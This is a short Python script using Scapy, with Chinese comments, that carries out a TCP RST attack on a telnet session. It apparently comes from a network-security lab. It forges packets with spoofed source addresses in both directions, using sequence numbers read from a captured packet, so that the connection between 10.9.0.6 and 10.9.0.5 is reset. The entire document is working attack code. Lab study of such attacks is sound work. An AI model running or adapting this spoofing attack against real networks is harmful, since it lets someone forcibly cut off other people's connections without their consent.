#!/usr/bin/env python3
from scapy.all import *

SEQ_C = 2812702622   # 客户端下一个序号（截图的 Seq，Len=0 所以 Next seq 相同）
SEQ_S = 2450169532   # 服务器下一个序号（截图的 Ack）

# 1) 冒充客户机，RST 发给服务器
send(IP(src="10.9.0.6", dst="10.9.0.5") /
     TCP(sport=40832, dport=23, flags="R", seq=SEQ_C), verbose=0)

# 2) 冒充服务器，RST 发给客户机（让客户机 telnet 立刻退出）
send(IP(src="10.9.0.5", dst="10.9.0.6") /
     TCP(sport=23, dport=40832, flags="R", seq=SEQ_S), verbose=0)